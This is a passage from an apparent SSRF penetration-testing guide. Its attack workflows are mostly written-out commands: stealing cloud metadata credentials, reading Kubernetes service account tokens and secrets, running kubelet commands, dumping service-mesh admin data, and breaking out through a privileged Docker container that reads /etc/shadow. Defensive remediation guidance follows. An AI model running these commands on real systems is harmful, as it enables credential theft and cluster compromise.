**Modern DNS Rebinding Tools:**

- **1u.ms** - Online DNS rebinding service (successor to rebinder.net)
- **Singularity of Origin** - Advanced rebinding toolkit with GUI
- **rbndr.us** - Simple rebinding for pentesting (format: `make-<ip1>-<ip2>-rbndr.us`)
- **lockyfork/rebind** - Docker container for self-hosted rebinding server
- **DNSRebindToolkit** - Python-based customizable rebinding server

Example usage:

```bash
# Using rbndr.us: first resolves to your server, then to internal IP
curl http://make-1.2.3.4-127.0.0.1-rbndr.us

# Using 1u.ms
curl http://1u.ms/A-127.0.0.1:1-2  # Alternates between external and localhost
```

### Practical Exploitation Workflows

#### Workflow 1: Cloud Metadata Credential Extraction

```mermaid
flowchart TD
    A[Identify SSRF Vector] --> B{Cloud Provider?}
    B -->|AWS| C[Test IMDSv1 Access]
    B -->|GCP| D[Test GCP Metadata]
    B -->|Azure| E[Test Azure IMDS]

    C --> C1{IMDSv1 Blocked?}
    C1 -->|No| C2[Extract Credentials]
    C1 -->|Yes| C3[Attempt IMDSv2 Bypass]

    C3 --> C4{Can Send PUT?}
    C4 -->|Yes| C5[Get Session Token]
    C4 -->|No| C6[Try Method Override]

    C5 --> C7[Extract Role Credentials]
    C6 --> C4

    D --> D1[Add Metadata-Flavor Header]
    D1 --> D2[Extract Service Account Token]

    E --> E1[Add Metadata: true Header]
    E1 --> E2[Extract Access Token]

    C2 --> F[Use Credentials]
    C7 --> F
    D2 --> F
    E2 --> F

    F --> G[Access AWS Resources]

    style A fill:#f9f,stroke:#333,stroke-width:2px
    style F fill:#9f9,stroke:#333,stroke-width:2px
    style G fill:#9f9,stroke:#333,stroke-width:2px
```

**Step-by-Step AWS Credential Extraction:**

```bash
# Step 1: Identify SSRF vector
# Assume vulnerable parameter: https://target.com/fetch?url=

# Step 2: Test basic metadata access
curl "https://target.com/fetch?url=http://169.254.169.254/"

# Step 3: Enumerate IAM roles
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Output: MyAppRole

# Step 4: If IMDSv1 works, extract credentials directly
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole"

# Step 5: If IMDSv2 required, attempt token acquisition
# Via method parameter (if application supports it)
curl -X POST "https://target.com/fetch" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://169.254.169.254/latest/api/token",
    "method": "PUT",
    "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
  }'

# Step 6: Use obtained token
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole" \
  -H "X-aws-ec2-metadata-token: TOKEN_HERE"

# Step 7: Configure AWS CLI with extracted credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Step 8: Verify access
aws sts get-caller-identity
aws s3 ls
```

#### Workflow 2: Kubernetes Cluster Compromise

```mermaid
flowchart TD
    A[SSRF in K8s Pod] --> B[Extract Service Account Token]
    B --> C[Test Kubelet API Access]
    C --> D{Kubelet Accessible?}

    D -->|Yes| E[List Pods on Node]
    D -->|No| F[Try K8s API Directly]

    E --> G[Execute Commands in Pods]
    G --> H[Escalate to Node]

    F --> I[List Namespaces/Pods]
    I --> J{Privileged Access?}

    J -->|Yes| K[Access Secrets]
    J -->|No| L[Enumerate Permissions]

    K --> M[Lateral Movement]
    L --> M
    H --> M

    M --> N[Full Cluster Compromise]

    style A fill:#f9f,stroke:#333,stroke-width:2px
    style N fill:#f66,stroke:#333,stroke-width:2px
```

**Step-by-Step Kubernetes Exploitation:**

```bash
# Step 1: Extract service account token
TOKEN=$(curl --unix-socket /var/run/secrets/kubernetes.io/serviceaccount/token)
# Or via SSRF:
TOKEN=$(curl "https://target.com/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token")

# Step 2: Test Kubelet access (often on localhost:10250)
curl -k "https://127.0.0.1:10250/pods"
# Via SSRF:
curl "https://target.com/fetch?url=https://127.0.0.1:10250/pods"

# Step 3: List pods and identify targets
curl -k "https://127.0.0.1:10250/pods" | jq '.items[].metadata.name'

# Step 4: Execute command in a pod (if kubelet allows)
curl -k "https://127.0.0.1:10250/run/default/target-pod/container-name" \
  -d "cmd=id"

# Step 5: Access Kubernetes API with service account token
K8S_API="https://kubernetes.default.svc"

# List all namespaces
curl -k -H "Authorization: Bearer $TOKEN" \
  "$K8S_API/api/v1/namespaces"

# List pods in default namespace
curl -k -H "Authorization: Bearer $TOKEN" \
  "$K8S_API/api/v1/namespaces/default/pods"

# Step 6: Access secrets (if permissions allow)
curl -k -H "Authorization: Bearer $TOKEN" \
  "$K8S_API/api/v1/namespaces/default/secrets"

# Step 7: Get specific secret
curl -k -H "Authorization: Bearer $TOKEN" \
  "$K8S_API/api/v1/namespaces/default/secrets/db-credentials" | \
  jq -r '.data | map_values(@base64d)'

# Step 8: Check service account permissions
kubectl auth can-i --list --token=$TOKEN
```

#### Workflow 3: Service Mesh Exploitation

```bash
# Step 1: Identify service mesh (via SSRF)
# Istio/Envoy
curl "http://target.com/fetch?url=http://127.0.0.1:15000/config_dump"

# Linkerd
curl "http://target.com/fetch?url=http://127.0.0.1:4191/metrics"

# Consul Connect
curl "http://target.com/fetch?url=http://127.0.0.1:8500/v1/agent/self"

# Step 2: Extract service mesh configuration (Istio example)
# Get full mesh topology
curl "http://target.com/fetch?url=http://127.0.0.1:15000/config_dump" > mesh_config.json

# Step 3: Identify interesting services
cat mesh_config.json | jq '.configs[] | select(.["@type"] | contains("type.googleapis.com/envoy.admin.v3.ClustersConfigDump"))'

# Step 4: Extract TLS certificates
curl "http://target.com/fetch?url=http://127.0.0.1:15000/certs"

# Step 5: Identify upstream services
curl "http://target.com/fetch?url=http://127.0.0.1:15000/clusters"

# Step 6: Access internal services using discovered endpoints
# Example: database service discovered at db.internal.svc:5432
curl "http://target.com/fetch?url=http://db.internal.svc:5432"

# Step 7: Exploit service-to-service authentication weaknesses
# If mesh relies on network-level security, SSRF bypasses it
```

### Reporting

- Document the affected endpoint and parameters
- Provide clear proof of concept
- Explain potential impact (data access, internal recon, etc.)
- Suggest specific remediation for the vulnerability
- Include any bypass techniques that worked

## Escalate

### Network Scanning and Service Discovery

- Perform Network Scanning to identify another vulnerable machine
- Pull Instance Metadata from cloud machines
- Kubernetes pivot: test common internal services from SSRF vantage point

### Kubernetes-Specific SSRF Attack Surface

> [!DANGER] Kubernetes SSRF Critical Impact
> SSRF vulnerabilities in Kubernetes environments can lead to full cluster compromise through service account token theft, kubelet API access, and service mesh exploitation. Default service accounts often have excessive permissions.

#### Service Account Token Theft

```bash
# From SSRF vantage point:

# 1. Extract service account token (mounted in every pod by default)
curl "http://target.com/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token"

# Alternative: via /proc if file:// protocol blocked
curl "http://target.com/fetch?url=file:///proc/self/root/var/run/secrets/kubernetes.io/serviceaccount/token"

# 2. Extract namespace
curl "http://target.com/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/namespace"

# 3. Extract CA certificate
curl "http://target.com/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# 4. Use service account to access Kubernetes API
TOKEN="<extracted-token>"
K8S_API="https://kubernetes.default.svc"

# List pods in current namespace
curl -k -H "Authorization: Bearer $TOKEN" \
  "$K8S_API/api/v1/namespaces/default/pods"

# List all namespaces (if permissions allow)
curl -k -H "Authorization: Bearer $TOKEN" \
  "$K8S_API/api/v1/namespaces"

# List secrets (high-value target)
curl -k -H "Authorization: Bearer $TOKEN" \
  "$K8S_API/api/v1/namespaces/default/secrets"

# Get specific secret
curl -k -H "Authorization: Bearer $TOKEN" \
  "$K8S_API/api/v1/namespaces/default/secrets/db-password" | \
  jq -r '.data | map_values(@base64d)'

# Check self permissions
curl -k -H "Authorization: Bearer $TOKEN" \
  "$K8S_API/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": {
      "resourceAttributes": {
        "namespace": "default",
        "verb": "get",
        "resource": "secrets"
      }
    }
  }'
```

#### Kubelet API Exploitation

```bash
# Kubelet API ports:
# 10250 - Read/write API (authenticated, but often weak)
# 10255 - Read-only API (legacy, often still open, NO AUTH)

# 1. Test kubelet read-only port (often unauthenticated)
curl "http://target.com/fetch?url=http://127.0.0.1:10255/pods"
curl "http://target.com/fetch?url=http://127.0.0.1:10255/spec/"
curl "http://target.com/fetch?url=http://127.0.0.1:10255/stats/"

# 2. Test kubelet read/write API
curl -k "http://target.com/fetch?url=https://127.0.0.1:10250/pods"

# 3. List all pods on the node
curl -k "http://target.com/fetch?url=https://127.0.0.1:10250/pods" | jq '.items[].metadata.name'

# 4. Execute commands in containers (requires authentication, but often weak)
# Format: /run/<namespace>/<pod>/<container>
curl -k "http://target.com/fetch?url=https://127.0.0.1:10250/run/default/nginx-pod/nginx-container" \
  -d "cmd=id"

# Common command injection payloads for kubelet
curl -k "https://127.0.0.1:10250/run/default/target-pod/container" \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# 5. Get logs from containers
curl -k "https://127.0.0.1:10250/logs/default/target-pod/container-name"

# 6. Port forward (if supported)
curl -k "https://127.0.0.1:10250/portForward/default/target-pod"

# 7. Access node metrics
curl -k "https://127.0.0.1:10250/metrics"
curl -k "https://127.0.0.1:10250/metrics/cadvisor"
```

#### Service Mesh Metadata Exposure

> [!WARNING] Service Mesh Information Disclosure
> Service mesh sidecars expose extensive configuration, topology, and certificate information through local admin interfaces. This can reveal the entire application architecture and facilitate lateral movement.

**Istio/Envoy Exploitation:**

```bash
# Envoy admin interface (default: localhost:15000, often NO AUTH)

# 1. Get complete Envoy configuration (includes all services, routes, certificates)
curl "http://target.com/fetch?url=http://127.0.0.1:15000/config_dump" > envoy_config.json

# Parse for interesting endpoints
cat envoy_config.json | jq '.configs[].dynamic_active_clusters'

# 2. List all upstream clusters (services)
curl "http://target.com/fetch?url=http://127.0.0.1:15000/clusters"

# Output shows:
# - Service names
# - Endpoints (IP:port)
# - Health status
# - Connection stats

# 3. Get all TLS certificates (can extract private keys if permissions allow)
curl "http://target.com/fetch?url=http://127.0.0.1:15000/certs"

# 4. View detailed statistics (reveals traffic patterns)
curl "http://target.com/fetch?url=http://127.0.0.1:15000/stats"
curl "http://target.com/fetch?url=http://127.0.0.1:15000/stats/prometheus"

# 5. Get listeners (exposed ports and routes)
curl "http://target.com/fetch?url=http://127.0.0.1:15000/listeners"

# 6. Runtime configuration modifications (if writable)
curl "http://target.com/fetch?url=http://127.0.0.1:15000/runtime"

# 7. Server information
curl "http://target.com/fetch?url=http://127.0.0.1:15000/server_info"

# 8. Alternative Envoy admin port
curl "http://target.com/fetch?url=http://127.0.0.1:15001/"

# Pilot discovery service (Istio control plane debugging)
curl "http://target.com/fetch?url=http://127.0.0.1:8080/debug/endpointz"
curl "http://target.com/fetch?url=http://127.0.0.1:8080/debug/configz"
curl "http://target.com/fetch?url=http://127.0.0.1:8080/debug/adsz"
curl "http://target.com/fetch?url=http://127.0.0.1:8080/debug/syncz"
```

**Linkerd Exploitation:**

```bash
# Linkerd proxy admin interface (default: 4191)

# 1. Prometheus metrics (reveals service topology and traffic)
curl "http://target.com/fetch?url=http://127.0.0.1:4191/metrics"

# Parse for service names and endpoints
curl "http://target.com/fetch?url=http://127.0.0.1:4191/metrics" | \
  grep -E "dst_service|authority"

# 2. Readiness endpoint
curl "http://target.com/fetch?url=http://127.0.0.1:4191/ready"

# 3. Liveness endpoint
curl "http://target.com/fetch?url=http://127.0.0.1:4191/live"

# 4. Inbound proxy admin (port 4140)
curl "http://target.com/fetch?url=http://127.0.0.1:4140/"

# 5. Outbound proxy admin (port 4191)
curl "http://target.com/fetch?url=http://127.0.0.1:4191/"

# 6. Tap interface (if enabled - real-time traffic inspection)
curl "http://target.com/fetch?url=http://127.0.0.1:4190/tap"
```

**Consul Connect Exploitation:**

```bash
# Consul agent API (default: 8500)

# 1. Agent configuration and membership
curl "http://target.com/fetch?url=http://127.0.0.1:8500/v1/agent/self"

# 2. Service catalog (lists all registered services)
curl "http://target.com/fetch?url=http://127.0.0.1:8500/v1/catalog/services"

# 3. Service health checks
curl "http://target.com/fetch?url=http://127.0.0.1:8500/v1/health/state/any"

# 4. Key-value store (may contain secrets)
curl "http://target.com/fetch?url=http://127.0.0.1:8500/v1/kv/?recurse"

# 5. Access Control Lists (ACLs)
curl "http://target.com/fetch?url=http://127.0.0.1:8500/v1/acl/list"

# 6. Intentions (service-to-service permissions)
curl "http://target.com/fetch?url=http://127.0.0.1:8500/v1/connect/intentions"

# 7. Certificate Authority
curl "http://target.com/fetch?url=http://127.0.0.1:8500/v1/connect/ca/roots"
```

#### Container Runtime Socket Exposure

> [!DANGER] Container Runtime Socket Exposure
> Access to container runtime sockets (Docker, containerd, CRI-O) provides root-equivalent access to the host system. Attackers can create privileged containers, mount host filesystems, and escape container isolation.

**Docker Socket Exploitation:**

```bash
# Docker socket: /var/run/docker.sock (Unix socket)
# If application supports Unix socket URLs or file:// protocol

# 1. Check if Docker socket is accessible
curl "http://target.com/fetch?url=file:///var/run/docker.sock"

# 2. If application translates Unix sockets to HTTP (some proxies do this)
# Example: Application at http://target.com/proxy?socket=/var/run/docker.sock&path=/version

# List Docker API version
curl "http://target.com/proxy?socket=/var/run/docker.sock&path=/version"

# 3. List all containers
curl --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json
# Via SSRF (if proxy supports it):
curl "http://target.com/proxy?socket=/var/run/docker.sock&path=/v1.41/containers/json"

# 4. Inspect specific container
curl --unix-socket /var/run/docker.sock \
  http://localhost/v1.41/containers/<container-id>/json

# 5. Create privileged container for host breakout
curl --unix-socket /var/run/docker.sock \
  -X POST -H "Content-Type: application/json" \
  http://localhost/v1.41/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/hostfs"]
    }
  }'

# 6. Start the container
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/v1.41/containers/<container-id>/start

# 7. Execute commands in the privileged container
curl --unix-socket /var/run/docker.sock \
  -X POST -H "Content-Type: application/json" \
  http://localhost/v1.41/containers/<container-id>/exec \
  -d '{
    "AttachStdout": true,
    "Cmd": ["cat", "/hostfs/etc/shadow"]
  }'

# 8. Pull images (for persistence)
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/v1.41/images/create?fromImage=malicious-image

# Alternative: via gopher protocol if supported
gopher://127.0.0.1:0/_GET%20/v1.41/containers/json%20HTTP/1.1%0AHost:%20docker%0A%0A
```

**containerd Socket Exploitation:**

```bash
# containerd socket: /run/containerd/containerd.sock

# containerd uses gRPC, more complex to exploit via SSRF
# But can still leak information

# 1. Check if socket exists
curl "http://target.com/fetch?url=file:///run/containerd/containerd.sock"

# 2. If HTTP gateway is exposed (less common)
curl "http://127.0.0.1:7887/v1/containers"

# 3. Via ctr command (if available in container)
ctr --address /run/containerd/containerd.sock containers list
ctr --address /run/containerd/containerd.sock images list
```

**CRI-O Socket Exploitation:**

```bash
# CRI-O socket: /var/run/crio/crio.sock

# 1. Check socket accessibility
curl "http://target.com/fetch?url=file:///var/run/crio/crio.sock"

# 2. CRI-O also uses gRPC (Container Runtime Interface)
# Direct exploitation requires gRPC client

# 3. Via crictl command (if available)
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps
crictl --runtime-endpoint unix:///var/run/crio/crio.sock pods
```

#### Container Metadata Services

```bash
# AWS ECS Task Metadata Endpoint (ECS/Fargate)
# Available at: 169.254.170.2 (ECS-specific, different from EC2 IMDS)

# 1. Task metadata (v2)
curl "http://target.com/fetch?url=http://169.254.170.2/v2/metadata"

# Output includes:
# - Cluster name
# - Task ARN
# - Task definition family/revision
# - Container instance ARN
# - Availability zone

# 2. Task IAM role credentials (high value target)
curl "http://target.com/fetch?url=http://169.254.170.2/v2/credentials"

# Returns:
# - AccessKeyId
# - SecretAccessKey
# - Token
# - Expiration

# 3. Task statistics
curl "http://target.com/fetch?url=http://169.254.170.2/v2/stats"

# 4. Task metadata v3 endpoint
curl "http://target.com/fetch?url=http://169.254.170.2/v3/"

# 5. Container-specific metadata
curl "http://target.com/fetch?url=http://169.254.170.2/v3/containers"

# 6. Task metadata v4 (latest)
curl "http://target.com/fetch?url=http://169.254.170.2/v4/metadata"

# Environment variable alternative (if file:// works)
curl "http://target.com/fetch?url=file:///proc/self/environ" | tr '\0' '\n' | grep ECS

# GCP Cloud Run Metadata
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google

# Cloud Run specific endpoints
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"

# Azure Container Instances
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true

# Azure ACI specific
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"
```

#### Kubernetes Dashboard and Management Tools

> [!INFO] Kubernetes Management Interface Exposure
> Many Kubernetes clusters run management interfaces accessible only from within the cluster network. SSRF can bypass network segmentation and access these admin interfaces.

```bash
# Kubernetes Dashboard (if exposed internally)
# Default: kubernetes-dashboard service in kube-system namespace

# 1. Access dashboard
curl "http://target.com/fetch?url=http://kubernetes-dashboard.kube-system.svc.cluster.local"

# 2. Dashboard API
curl "http://target.com/fetch?url=http://kubernetes-dashboard.kube-system.svc.cluster.local/api/v1/namespace"

# 3. If dashboard requires token, use extracted service account token
TOKEN="<service-account-token>"
curl -H "Authorization: Bearer $TOKEN" \
  "http://kubernetes-dashboard.kube-system.svc.cluster.local/api/v1/pod/default"

# Prometheus (common monitoring solution)
# 1. Prometheus API
curl "http://target.com/fetch?url=http://prometheus.monitoring.svc.cluster.local:9090/api/v1/query?query=up"

# 2. List all metrics
curl "http://target.com/fetch?url=http://prometheus.monitoring.svc.cluster.local:9090/api/v1/label/__name__/values"

# 3. Query for sensitive information
curl "http://target.com/fetch?url=http://prometheus.monitoring.svc.cluster.local:9090/api/v1/query?query=kube_secret_info"

# 4. Prometheus targets (reveals all monitored services)
curl "http://target.com/fetch?url=http://prometheus.monitoring.svc.cluster.local:9090/api/v1/targets"

# Grafana (visualization dashboard)
# 1. Grafana API
curl "http://target.com/fetch?url=http://grafana.monitoring.svc.cluster.local:3000/api/health"

# 2. List dashboards (may require auth)
curl "http://target.com/fetch?url=http://grafana.monitoring.svc.cluster.local:3000/api/dashboards/home"

# 3. Anonymous access (if enabled)
curl "http://target.com/fetch?url=http://grafana.monitoring.svc.cluster.local:3000/api/org"

# ArgoCD (GitOps deployment tool)
# 1. ArgoCD API
curl "http://target.com/fetch?url=http://argocd-server.argocd.svc.cluster.local/api/version"

# 2. List applications (may reveal deployment secrets)
curl "http://target.com/fetch?url=http://argocd-server.argocd.svc.cluster.local/api/v1/applications"

# 3. Get application details
curl "http://target.com/fetch?url=http://argocd-server.argocd.svc.cluster.local/api/v1/applications/app-name"

# Rancher (cluster management platform)
# 1. Rancher API
curl "http://target.com/fetch?url=http://rancher.cattle-system.svc.cluster.local/v3"

# 2. List clusters
curl "http://target.com/fetch?url=http://rancher.cattle-system.svc.cluster.local/v3/clusters"

# 3. Authentication endpoints
curl "http://target.com/fetch?url=http://rancher.cattle-system.svc.cluster.local/v3-public/localProviders/local"

# Harbor (container registry)
# 1. Harbor API
curl "http://target.com/fetch?url=http://harbor.harbor-system.svc.cluster.local/api/v2.0/projects"

# 2. System info
curl "http://target.com/fetch?url=http://harbor.harbor-system.svc.cluster.local/api/v2.0/systeminfo"

# 3. Health check
curl "http://target.com/fetch?url=http://harbor.harbor-system.svc.cluster.local/api/v2.0/health"

# Kubernetes Metrics Server
curl "http://target.com/fetch?url=http://metrics-server.kube-system.svc.cluster.local/metrics"

# CoreDNS (DNS service - can leak service names)
# Usually doesn't have HTTP API, but can be queried via DNS
# If SSRF supports DNS protocol:
dig @coredns.kube-system.svc.cluster.local kubernetes.default.svc.cluster.local

# Elasticsearch (if used for logging)
curl "http://target.com/fetch?url=http://elasticsearch.logging.svc.cluster.local:9200/_cluster/health"
curl "http://target.com/fetch?url=http://elasticsearch.logging.svc.cluster.local:9200/_cat/indices"

# Kibana (log visualization)
curl "http://target.com/fetch?url=http://kibana.logging.svc.cluster.local:5601/api/status"

# Jaeger (distributed tracing)
curl "http://target.com/fetch?url=http://jaeger-query.observability.svc.cluster.local:16686/api/services"
```

**Common Kubernetes Service Discovery Patterns:**

```bash
# Kubernetes DNS naming convention:
# <service-name>.<namespace>.svc.cluster.local

# Common namespaces to check:
# - default
# - kube-system
# - kube-public
# - kube-node-lease
# - monitoring
# - logging
# - observability
# - argocd
# - cattle-system (Rancher)
# - harbor-system
# - istio-system
# - linkerd

# Enumerate services via DNS if SSRF supports it
for ns in default kube-system monitoring; do
  for svc in kubernetes-dashboard prometheus grafana argocd-server; do
    curl "http://target.com/fetch?url=http://$svc.$ns.svc.cluster.local"
  done
done
```

## Remediation Recommendations

> [!NOTE] Defense in Depth Strategy
> SSRF prevention requires multiple layers of controls. No single mitigation is sufficient; implement validation, network segmentation, and monitoring together.

### Input Validation and Parsing

- **Strict URL validation**:
  - Use a trusted RFC-3986 compliant URL parser
  - Validate scheme (allowlist: https only, if possible)
  - Validate hostname/IP before and after DNS resolution
  - Reject URLs with authentication credentials (`http://user:pass@host`)
  - Reject URLs with rare or unusual schemes

- **Allowlist approach** (preferred over denylists):
  - Maintain strict allowlist of permitted domains/IPs
  - Validate scheme → network range → domain in separate stages
  - Re-validate after each HTTP redirect
  - Use FQDN validation (no IP addresses unless absolutely necessary)

- **DNS resolution validation**:
  - Resolve DNS before making request
  - Validate resolved IP is not in private ranges (RFC 1918, RFC 4193)
  - Reject link-local addresses (169.254.0.0/16)
  - Reject loopback addresses (127.0.0.0/8, ::1)
  - Implement DNS pinning (cache first resolution for request lifetime)

- **Redirect handling**:
  - Limit number of redirects (max 2-3)
  - Re-validate destination after each redirect
  - Disallow redirects to private address spaces
  - Reject protocol downgrades (https → http)

- **Rate limiting and throttling**:
  - Implement per-user/per-IP rate limits
  - Add delays between requests to prevent port scanning
  - Limit total number of requests per time window

### Network-Level Controls

> [!WARNING] Network Segmentation Critical
> Network controls are the last line of defense when input validation fails. Implement strict egress filtering and segmentation for all workloads that make external requests.

- **Network segmentation**:
  - Isolate workloads that make external requests into dedicated network segments
  - Use separate VPCs/VNets for different trust zones
  - Implement microsegmentation for container workloads

- **Egress filtering** (critical defense):
  - Default-deny egress firewall rules
  - Allowlist only required external destinations
  - Block access to metadata services at network level:
    - AWS: Block 169.254.169.254 (except for workloads that need it)
    - GCP: Block metadata.google.internal
    - Azure: Block 169.254.169.254 and 168.63.129.16
  - Block all RFC 1918 private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
  - Block link-local addresses (169.254.0.0/16)
  - Block loopback (127.0.0.0/8)

- **Firewall rules**:
  - Implement stateful inspection
  - Log all blocked connection attempts
  - Alert on suspicious patterns (rapid port scanning, metadata access attempts)

- **Disable unused protocols**:
  - Disable file:// scheme handlers
  - Disable gopher:// protocol
  - Disable dict:// protocol
  - Disable ftp://, tftp:// if not needed
  - Only allow http:// and https://

### Cloud-Specific Controls

> [!DANGER] IMDSv2 Enforcement Required
> AWS IMDSv1 should be disabled on all EC2 instances. Enforce IMDSv2 to prevent basic SSRF attacks against metadata service.

**AWS-Specific Mitigations:**

```bash
# 1. Enforce IMDSv2 on all instances
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-put-response-hop-limit 1

# 2. Disable IMDS entirely for workloads that don't need it
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-endpoint disabled

# 3. Use VPC endpoints to avoid IMDS dependency
# Example: S3 VPC endpoint
aws ec2 create-vpc-endpoint \
  --vpc-id vpc-123456 \
  --service-name com.amazonaws.us-east-1.s3 \
  --route-table-ids rtb-123456

# 4. Network-level blocking via security groups
# Block 169.254.169.254 for workloads that don't need IMDS

# 5. Use IAM roles with minimal permissions
# Apply principle of least privilege to instance profiles
```

**GCP-Specific Mitigations:**

```bash
# 1. Disable legacy metadata endpoints
gcloud compute instances add-metadata INSTANCE_NAME \
  --metadata disable-legacy-endpoints=true

# 2. Require custom metadata header validation
# Application must validate Metadata-Flavor: Google header

# 3. Use Workload Identity (GKE)
# Avoid node-level service accounts
gcloud container clusters update CLUSTER_NAME \
  --workload-pool=PROJECT_ID.svc.id.goog

# 4. Network tags and firewall rules
gcloud compute firewall-rules create block-metadata \
  --action deny \
  --rules all \
  --destination-ranges 169.254.169.254/32 \
  --target-tags no-metadata-access
```

**Azure-Specific Mitigations:**

```bash
# 1. Validate Metadata: true header
# Application must verify this header is present

# 2. Use Managed Identity instead of IMDS when possible
az vm identity assign --name VM_NAME --resource-group RG_NAME

# 3. Network Security Groups (NSG) to block metadata
az network nsg rule create \
  --resource-group RG_NAME \
  --nsg-name NSG_NAME \
  --name block-metadata \
  --priority 100 \
  --destination-address-prefixes 169.254.169.254 \
  --access Deny

# 4. Azure Firewall rules
az network firewall network-rule create \
  --firewall-name FW_NAME \
  --collection-name block-metadata \
  --destination-addresses 169.254.169.254 \
  --action Deny
```

**Kubernetes-Specific Mitigations:**

```yaml
# 1. Disable service account token automounting (unless needed)
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-service-account
automountServiceAccountToken: false

# In Pod spec:
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  automountServiceAccountToken: false
  containers:
  - name: app
    image: myapp:latest

# 2. Network Policies to restrict egress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-egress
spec:
  podSelector:
    matchLabels:
      app: myapp
  policyTypes:
  - Egress
  egress:
  # Allow DNS
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53
  # Allow specific external IPs only
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 10.0.0.0/8
        - 172.16.0.0/12
        - 192.168.0.0/16
        - 169.254.169.254/32
    ports:
    - protocol: TCP
      port: 443

# 3. Pod Security Standards/Policies
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  # Prevent hostPath mounts
  hostNetwork: false
  hostIPC: false
  hostPID: false

# 4. Restrict kubelet access
# Set kubelet authentication mode to webhook
# In kubelet config:
authentication:
  webhook:
    enabled: true
authorization:
  mode: Webhook

# 5. RBAC - minimal permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: minimal-role
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get"]
# Grant only specific permissions needed
```

### Application-Level Protections

- **Use resource identifiers instead of URLs**:
  ```python
  # Bad: Accept arbitrary URLs
  def fetch_image(url):
      return requests.get(url)

  # Good: Use resource IDs, map internally to URLs
  ALLOWED_IMAGES = {
      "logo": "https://cdn.example.com/logo.png",
      "banner": "https://cdn.example.com/banner.png"
  }

  def fetch_image(image_id):
      if image_id not in ALLOWED_IMAGES:
          raise ValueError("Invalid image ID")
      return requests.get(ALLOWED_IMAGES[image_id])
  ```

- **Use pre-signed URLs for cloud resources**:
  ```python
  # AWS S3 example
  import boto3

  s3_client = boto3.client('s3')

  # Generate pre-signed URL (client downloads directly, no SSRF)
  presigned_url = s3_client.generate_presigned_url(
      'get_object',
      Params={'Bucket': 'my-bucket', 'Key': 'file.pdf'},
      ExpiresIn=3600
  )
  ```

- **Implement proper access controls**:
  - Require authentication for URL fetching endpoints
  - Implement authorization checks
  - Use signed callbacks with HMAC verification
  - Implement request signing to prevent replay attacks

- **Use secure defaults**:
  - Disable redirects by default
  - Set short timeouts (5-10 seconds max)
  - Limit response size (prevent memory exhaustion)
  - Use secure TLS settings (reject invalid certs)

- **Request signing and HMAC validation**:
  ```python
  import hmac
  import hashlib

  def generate_signed_url(url, secret_key):
      signature = hmac.new(
          secret_key.encode(),
          url.encode(),
          hashlib.sha256
      ).hexdigest()
      return f"{url}?signature={signature}"

  def validate_signed_url(url, signature, secret_key):
      expected_sig = hmac.new(
          secret_key.encode(),
          url.encode(),
          hashlib.sha256
      ).hexdigest()
      return hmac.compare_digest(expected_sig, signature)
  ```

- **Sandboxed egress proxy**:
  - Route all external requests through dedicated proxy
  - Implement allowlist at proxy level
  - Re-validate IP after DNS resolution
  - Log all requests for monitoring

- **Two-stage validation**:
  ```python
  import ipaddress
  import socket
  from urllib.parse import urlparse

  def is_safe_url(url):
      # Stage 1: Parse and validate URL structure
      parsed = urlparse(url)

      # Only allow https
      if parsed.scheme != 'https':
          return False

      # Validate hostname format
      hostname = parsed.hostname
      if not hostname:
          return False

      # Stage 2: Resolve and validate IP
      try:
          ip = socket.gethostbyname(hostname)
          ip_obj = ipaddress.ip_address(ip)

          # Reject private/reserved IPs
          if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
              return False

          # Additional checks for specific ranges
          if ip_obj in ipaddress.ip_network('169.254.0.0/16'):
              return False

      except socket.gaierror:
          return False

      return True
  ```

### HTTP/2 Specific Protections

- **Connection coalescing prevention**:
  - Verify SNI matches Host header on every new TLS connection
  - Reject connections attempting to access services not explicitly in certificate SAN
  - Implement strict TLS certificate validation

